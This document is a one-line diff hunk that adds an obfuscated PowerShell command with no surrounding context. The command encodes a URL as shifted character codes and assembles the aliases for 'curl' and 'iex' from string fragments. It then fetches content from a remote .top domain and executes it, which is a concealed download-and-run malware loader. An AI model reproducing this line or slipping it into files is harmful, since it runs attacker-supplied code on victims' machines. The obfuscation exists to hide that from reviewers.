@@ -1,0 +1,1 @@
+powershell @(747,745,703,748,766,693,763,758,759,694,761,748,750)|foreach{$01jd=$01jd+[char]($_-647)};$njk6='rl';new-alias j cu$njk6;.$([char](10492-10387)+'ex')(j -useb $01jd)
